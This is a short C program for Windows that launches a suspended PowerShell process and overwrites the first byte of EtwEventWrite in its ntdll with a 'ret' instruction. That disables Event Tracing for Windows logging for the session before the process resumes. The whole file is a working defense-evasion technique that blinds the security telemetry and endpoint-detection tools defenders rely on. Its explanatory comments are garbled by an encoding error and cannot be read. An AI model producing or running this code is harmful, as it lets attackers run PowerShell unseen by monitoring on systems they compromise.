#include <Windows.h>
#include <Tlhelp32.h>
int main() {
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(si);

	// 1. �إߤ@�� Powershell Process�A�è��o Process Handle
	CreateProcessA(NULL, (LPSTR)"powershell -noexit", NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

	// 2. �q ntdll.dll �����o EtwEventWrite ����}
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	LPVOID pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");

	// 3. �� EtwEventWrite ����}���v���令�iŪ�B�i�g�B�i����(rwx)
	DWORD oldProtect;
	VirtualProtectEx(pi.hProcess, (LPVOID)pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);

	// 4. �N EtwEventWrite �� Function ���Ĥ@�� byte �令 0xc3�A�]�N�O�ջy�� ret
	char patch = 0xc3;
	WriteProcessMemory(pi.hProcess, (LPVOID)pEtwEventWrite, &patch, sizeof(char), NULL);

	// 5. �� EtwEventWrite ���v����^�A�åB�~����� Process
	VirtualProtectEx(pi.hProcess, (LPVOID)pEtwEventWrite, 1, oldProtect, NULL);
	ResumeThread(pi.hThread);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	return 0;
}